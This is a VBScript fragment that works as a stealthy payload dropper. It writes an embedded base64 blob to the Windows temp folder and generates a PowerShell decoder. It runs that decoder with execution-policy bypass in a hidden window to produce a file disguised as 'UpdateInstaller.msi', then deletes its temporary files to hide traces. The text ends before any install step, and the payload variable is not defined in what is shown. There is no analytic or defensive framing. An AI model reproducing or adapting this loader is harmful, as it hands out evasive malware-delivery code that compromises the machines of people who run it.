Dim fso, tempFolder, msiPath, base64File, psDecodeScript, psDecodeFile, decodeResult
Set fso = CreateObject("Scripting.FileSystemObject")
tempFolder = fso.GetSpecialFolder(2)
msiPath = fso.BuildPath(tempFolder, "UpdateInstaller.msi")
base64File = fso.BuildPath(tempFolder, "msi_base64_temp.txt")
psDecodeFile = fso.BuildPath(tempFolder, "decode_base64.ps1")

Set base64FileObj = fso.CreateTextFile(base64File, True, True)
base64FileObj.Write msiBase64
base64FileObj.Close

psDecodeScript = "$base64 = Get-Content -Path '" & base64File & "' -Raw -Encoding ASCII;" & vbCrLf & _
                 "$bytes = [System.Convert]::FromBase64String($base64);" & vbCrLf & _
                 "[System.IO.File]::WriteAllBytes('" & msiPath & "', $bytes);" & vbCrLf & _
                 "Write-Host 'SUCCESS'"

Set psDecodeFileObj = fso.CreateTextFile(psDecodeFile, True, True)
psDecodeFileObj.Write psDecodeScript
psDecodeFileObj.Close

Dim shell
Set shell = CreateObject("WScript.Shell")
decodeResult = shell.Run("powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & psDecodeFile & """", 0, True)

If fso.FileExists(base64File) Then fso.DeleteFile base64File
If fso.FileExists(psDecodeFile) Then fso.DeleteFile psDecodeFile

If Not fso.FileExists(msiPath) Then
    WScript.Quit
End If

